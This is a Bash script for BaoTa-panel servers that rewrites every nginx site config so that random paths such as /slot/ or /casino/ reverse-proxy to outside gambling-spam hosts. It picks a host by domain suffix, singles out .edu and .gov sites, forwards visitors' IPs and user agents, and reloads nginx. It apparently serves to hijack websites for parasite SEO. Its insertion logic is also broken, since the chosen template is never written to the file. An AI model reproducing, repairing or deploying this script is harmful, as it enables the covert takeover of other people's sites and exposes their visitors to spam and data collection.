#!/bin/bash

NGINX_DIR="/www/server/panel/vhost/nginx"

# 路径池
COM_PATHS=("help" "news" "page" "blog" "about" "support" "info")
IN_PATHS=("pg" "pgslot" "slot" "game" "casino" "live")

# 模板
read -r -d '' COM_TEMPLATE << 'EOF'
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }
EOF

read -r -d '' IN_TEMPLATE << 'EOF'
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host ide.hashbank8.com;
        proxy_set_header X-RealIP $remote_addr;
        proxy_set_header XForwardedFor $proxy_add_x_forwarded_for;
        proxy_set_header XForwardedProto $scheme;
        proxy_set_header UserAgent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://ide.hashbank8.com;
    }
EOF

read -r -d '' TH_TEMPLATE << 'EOF'
    location /%PATH%/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/%PATH%/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host th.cogicpt.org;
        proxy_set_header XRealIP $remote_addr;
        proxy_set_header XForwardedFor $proxy_add_x_forwarded_for;
        proxy_set_header XForwardedProto $scheme;
        proxy_set_header UserAgent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://th.cogicpt.org;
    }
EOF

# 随机选路径函数
rand_item() {
    local arr=("$@")
    echo "${arr[$RANDOM % ${#arr[@]}]}"
}

echo "开始处理 Nginx 配置文件..."

for file in "$NGINX_DIR"/*.conf; do
    fname=$(basename "$file")

    # 跳过宝塔默认文件
    case "$fname" in
        default.conf|0*.conf|phpmyadmin*.conf)
            echo "跳过系统默认文件：$fname"
            continue
        ;;
    esac

    echo ""
    echo "处理：$fname"

    # 判断是否已包含后端
    if grep -qE "(xzz\.pier46\.com|ide\.hashbank8\.com|th\.cogicpt\.org)" "$file"; then
        echo " └ [已处理] 已包含后端，跳过"
        continue
    fi

    echo " └ 未处理，开始插入随机路径模板..."

    TMPFILE=$(mktemp)

    while IFS= read -r line; do
        echo "$line" >> "$TMPFILE"

        if [[ "$line" =~ server_name ]]; then
            # 提取 server_name 域名
            real_domains=$(echo "$line" | awk '{for(i=2;i<=NF;i++) print $i}' | tr -d ';')
            domain_key=$(echo "$real_domains" | cut -d'.' -f2)

            # 后端判断逻辑
            if echo "$real_domains" | grep -qiE '\.(edu|gov|vn|th)$'; then
                backend="th.cogicpt.org"
                template="$TH_TEMPLATE"
                pool=("${IN_PATHS[@]}")
            elif echo "$domain_key" | grep -qE '\.(in|id|pe|bd)$'; then
                backend="ide.hashbank8.com"
                template="$IN_TEMPLATE"
                pool=("${IN_PATHS[@]}")
            else
                backend="xzz.pier46.com"
                template="$COM_TEMPLATE"
                pool=("${COM_PATHS[@]}")
            fi

            # 随机选路径
            R_PATH=$(rand_item "${pool[@]}")
        fi

    done < "$file"

    mv "$TMPFILE" "$file"
    echo " └ 插入完成：$fname"
done

echo ""
echo "重启 Nginx..."
/etc/init.d/nginx reload 2>/dev/null || /etc/init.d/nginx restart
echo "全部完成！"
